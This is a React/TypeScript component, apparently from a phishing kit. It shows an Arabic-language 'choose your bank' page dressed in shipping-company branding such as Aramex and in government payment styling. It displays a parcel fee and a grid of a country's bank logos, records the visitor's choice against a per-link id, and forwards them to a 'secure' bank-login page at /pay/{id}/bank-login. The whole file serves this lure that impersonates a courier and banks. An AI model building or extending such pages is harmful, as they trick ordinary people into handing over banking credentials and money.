import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import BrandedTopBar from "@/components/BrandedTopBar";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import BrandedCarousel from "@/components/BrandedCarousel";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  const preselectedBank = linkData?.payload?.selected_bank;
  
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(amount, currencyCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = async (bankId: string) => {
    setSelectedBank(bankId);
    
    if (!linkData) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: bankId,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
    }

    setTimeout(() => {
      navigate(`/pay/${id}/bank-login`);
    }, 400);
  };
  
  const handleSkip = async () => {
    if (!linkData) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: 'skipped',
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
    }

    toast({
      title: "تم التخطي",
      description: "سيتم تسجيل الدخول بدون تحديد بنك",
    });

    navigate(`/pay/${id}/bank-login`);
  };
  
  if (linkLoading || !linkData) {
    return (
      <div 
        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
        dir="rtl"
        style={{
          background: govSystem.colors.surface
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
          <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <>
      <BrandedTopBar 
        serviceKey={serviceKey}
        serviceName={serviceName}
        showBackButton={true}
        backPath={`/pay/${id}/details`}
        showCarousel={false}
      />
      
      <BrandedCarousel serviceKey={serviceKey} className="mb-6" />

      <div 
        className="min-h-screen py-6 sm:py-8" 
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${companyBranding?.colors.background || govSystem.colors.surface}, ${companyBranding?.colors.surface || '#ffffff'})`,
          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
        }}
      >
        <div className="container mx-auto px-4 max-w-4xl">
          <div className="mb-8 text-center">
            <h1 
              className="text-3xl sm:text-4xl font-bold mb-3" 
              style={{ 
                color: companyBranding?.colors.text || govSystem.colors.text,
                fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
              }}
            >
              اختر البنك
            </h1>
            <p 
              className="text-lg sm:text-xl font-semibold" 
              style={{ 
                color: companyBranding?.colors.primary || govSystem.colors.primary,
                fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
              }}
            >
              {formattedAmount}
            </p>
          </div>

        {loadingBanks ? (
          <div className="text-center py-12">
            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
            <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البنوك...</p>
          </div>
        ) : banks.length === 0 ? (
          <Card className="p-8 text-center" style={{ borderRadius: govSystem.borderRadius.lg }}>
            <Building2 className="w-12 h-12 mx-auto mb-4" style={{ color: govSystem.colors.textLight }} />
            <p className="mb-4" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>لا توجد بنوك متاحة لهذه الدولة</p>
            <Button 
              onClick={handleSkip} 
              variant="outline"
              style={{ 
                borderColor: govSystem.colors.primary,
                color: govSystem.colors.primary,
                fontFamily: govSystem.fonts.primaryAr
              }}
            >
              متابعة بدون تحديد بنك
            </Button>
          </Card>
        ) : (
          <>
            <div className="grid grid-cols-3 sm:grid-cols-4 gap-4 sm:gap-6 mb-8">
              {banks.map((bank) => (
                <div
                  key={bank.id}
                  className="group relative cursor-pointer"
                  onClick={() => handleBankSelect(bank.id)}
                >
                  <div 
                    className="relative overflow-hidden rounded-2xl bg-white p-4 sm:p-6 transition-all duration-500 hover:scale-105 hover:shadow-2xl border-2"
                    style={{
                      borderColor: selectedBank === bank.id ? (bank.color || govSystem.colors.primary) : '#e5e7eb',
                      boxShadow: selectedBank === bank.id ? `0 10px 40px -10px ${bank.color || govSystem.colors.primary}60` : '0 2px 8px rgba(0,0,0,0.08)',
                    }}
                  >
                    {selectedBank === bank.id && (
                      <div
                        className="absolute top-2 right-2 w-6 h-6 rounded-full flex items-center justify-center shadow-lg z-10"
                        style={{ backgroundColor: bank.color || govSystem.colors.primary }}
                      >
                        <svg className="w-4 h-4 text-white" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" viewBox="0 0 24 24" stroke="currentColor">
                          <path d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    )}
                    
                    <div className="aspect-square flex items-center justify-center">
                      <BankLogo 
                        bankId={bank.id}
                        bankName={bank.name}
                        bankNameAr={bank.nameAr}
                        color={bank.color}
                        size="xl"
                        className="w-full h-full object-contain transition-transform duration-500 group-hover:scale-110"
                      />
                    </div>
                  </div>
                </div>
              ))}
            </div>

            <div className="max-w-xl mx-auto">
              <Button
                onClick={handleSkip}
                variant="outline"
                className="w-full h-12 text-base"
                style={{
                  borderColor: govSystem.colors.primary + '50',
                  color: govSystem.colors.text,
                }}
              >
                تخطي واستخدام أي بنك
              </Button>
            </div>

            <div className="mt-6 p-4 rounded-xl border text-center" style={{ backgroundColor: `${govSystem.colors.primary}08`, borderColor: `${govSystem.colors.primary}30` }}>
              <p className="text-sm" style={{ color: govSystem.colors.text }}>
                🔐 انقر على شعار البنك للانتقال لصفحة تسجيل الدخول الآمنة
              </p>
            </div>
          </>
        )}
      </div>
    </div>
    </>
  );
};

export default PaymentBankSelector;
